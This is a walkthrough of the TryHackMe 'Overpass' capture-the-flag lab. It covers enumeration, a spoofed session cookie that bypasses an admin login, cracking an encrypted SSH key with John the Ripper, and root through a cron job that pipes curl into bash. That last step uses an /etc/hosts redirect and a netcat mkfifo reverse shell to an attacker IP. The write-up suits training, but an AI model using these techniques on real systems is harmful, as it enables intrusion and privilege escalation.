# TryHackMe: Overpass (Write-up)

[Overpass](https://tryhackme.com/room/overpass) is a TryHackMe CTF. 

Computer science students have made a password manager.
Need to get user & root flags from machine.

## Enumeration

### Nmap scan
__Nmap scan__ shows 2 services; SSH & HTTP.

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/anonymous$ nmap 10.10.247.29
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-02 12:16 BST
Nmap scan report for 10.10.247.29
Host is up (0.022s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```

### HTTP server

Browse to host on 10.10.247.29:80.

Shows a website about a secure password manager.

Pages:
- Home: `/`
- AboutUS: `/aboutus`
- Downloads: `/downloads`

__About Us page__
Shows a number of staff members:
- Ninja
- Pars
- Syzmex
- Bee
- MuirlandOracle
(Most of which are THM memebers).

__Downloads page__
Contains a number of binaries for different OSs.
Source code, written in Go.
Build script, shell script.

### GoBuster enumeration

Though we found a few directories in previous section, we can enumerate more

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box$ gobuster dir -u http://10.10.247.29 -w /usr/share/seclists/Discovery/Web-Content/common.txt clear
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.247.29
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/02 12:24:53 Starting gobuster
===============================================================
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/downloads (Status: 301)
/img (Status: 301)
/index.html (Status: 301)
===============================================================
2020/10/02 12:25:02 Finished
===============================================================``
```

We found another directory; `/admin`.

### Admin page

`/admin` page should a simple login form. 
Attempted basic SQL injection, but to no avail.

We could bruteforce this form with `hydra`. 

But to do that we'd need a username.
We're yet to get any solid usernames though. 
Despite us knowing some basic names.

In the password manager source code we see an old comment.
The comment contains reference to some human 'Steve'. This could be a potentially bruteforceable account, `steve` or `steven`.

```go
func serviceSearch(passlist []passListEntry, serviceName string) (int, passListEntry) {
	//A linear search is the best I can do, Steve says it's Oh Log N whatever that means
	for index, entry := range passlist {
		if entry.Name == serviceName {
```

The login form button doesn't seem to _do_ anything. The form seems to be fired by `login.js`. And sends values to `/api/login`.

`login.js` on this page also shows us, somewhat, how authentication works. 

A cookie is set on authentication confirmation.
See the end of `login()`.

```javascript
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

In the else statement, `SessionToken` is set with the response from the API. 

We can try spoof a cookie and see the outcome.
You can create cookies in the FireFox console; goto the Storage tab, and create cookie with name `SessionToken`, and some value.

## Admin panel access

After spoofing the cookie and refreshing the page. We're redirected to the admin panel.

On the admin panel we see an __RSA private key__.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

We also see reference to another human; '__James__'. 

There's also a quote, from '__Paradox__'

## Exploiting RSA

We can try to use the private key to get access to the system via SSH.

First we need to save the file somewhere, do we can ingest the key as usable for SSH.

Make sure to the set the chmod permissions on the file.

Then try to generate keys. We can't because the private key is password encrypted.

We can crack this with John The Ripper.
First, we need to generate a hash for John.
We can use `ssh2john`.

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/overpass$ python3 /usr/share/john/ssh2john.py overpass_rsa.key > overpass_rsa.hash
kali@kali:~/Desktop/repos/ctf/try-hack-me/overpass$
```

After generating a hash, we can run it through `john`.

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/overpass$ sudo john overpass_rsa.hash  --format=SSH
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
james13          (overpass_rsa.key)
1g 0:00:00:08  3/3 0.1199g/s 632856p/s 632856c/s 632856C/s pjbudo..sexasting
Session aborted
kali@kali:~/Desktop/repos/ctf/try-hack-me/overpass$
```

## SSH (User flag)

We can then connect to machine via SSH. The user `james` lets us connect; with password `james13`.

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/overpass$ ssh james@10.10.211.116 -i overpass_rsa.key
load pubkey "overpass_rsa.key": invalid format
Enter passphrase for key 'overpass_rsa.key':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct  2 19:33:01 UTC 2020

  System load:  0.0                Processes:           88
  Usage of /:   22.2% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address for eth0: 10.10.211.116
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ ls -lah
total 48K
drwxr-xr-x 6 james james 4.0K Jun 27 16:07 .
drwxr-xr-x 4 root  root  4.0K Jun 27 02:20 ..
lrwxrwxrwx 1 james james    9 Jun 27 02:38 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Jun 27 02:20 .bash_logout
-rw-r--r-- 1 james james 3.7K Jun 27 02:20 .bashrc
drwx------ 2 james james 4.0K Jun 27 04:45 .cache
drwx------ 3 james james 4.0K Jun 27 04:45 .gnupg
drwxrwxr-x 3 james james 4.0K Jun 27 04:20 .local
-rw-r--r-- 1 james james   49 Jun 27 04:26 .overpass
-rw-r--r-- 1 james james  807 Jun 27 02:20 .profile
drwx------ 2 james james 4.0K Jun 27 04:44 .ssh
-rw-rw-r-- 1 james james  438 Jun 27 04:23 todo.txt
-rw-rw-r-- 1 james james   38 Jun 27 16:07 user.txt
james@overpass-prod:~$
```

## Finding vulnerabilities

After gaining access, can see /home/james/todo.txt.
Mentions he wrote his password somewhere..

```shell
james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

We can get the /etc/passwd file

```shell
james@overpass-prod:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
james:x:1001:1001:,,,:/home/james:/bin/bash
```

## Get james password

After reading through the password manager's source code we find that passwords are stored in `~/.overpass`. We is in /home/james.

```shell
james@overpass-prod:~$ strings .overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```

## Decrypt password

We also found that the password manager uses ROT47 encryption.
Ran the ciphertext through ROT47 decrypter. 

```shell
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

This is `james`'s password. Because we now have his password, we can see what commands we can run as `sudo`.

## Exploit build script

The todo.txt file mentions a buildscript that's not working.
Apparently it runs on a timer?
Sounds like it could be a `crontab` thing.

We found the following line in `/etc/crontab`.
It downloads and runs a script as `root`.

```shell
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

`overpass.thm` can be exploited via the `/etc/hosts` file.

```shell
james@overpass-prod:/etc$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
 The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@overpass-prod:/etc$
```

We just need to start a HTTP server that hosts a rogue script. 
Then, it will pipe into bash.

```shell
mkdir python-server;
cd python-server;
mkdir downloads; mkdir downloads/src;
echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.11.8.219 4444 > /tmp/f;' > /downloads/src/buildscript.sh; 
python3 -m http.server;
```
The server is setup and running with the rogue script.

We need to start a listener on the attacker machine.

```shell
nc -lvp 4444
```

Update the victim /etc/hosts file

```shell
10.11.8.219 overpass.thm
# instead of 127.0.0.1 ...
```

Wait for a download...

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/overpass/python-server$ sudo python3 -m http.server 80 
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.211.116 - - [02/Oct/2020 21:31:33] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 
```

## Get root flag

And finally, after the exploited buildscript.sh has run, we get root.
```shell
THM{<redacted>}
```

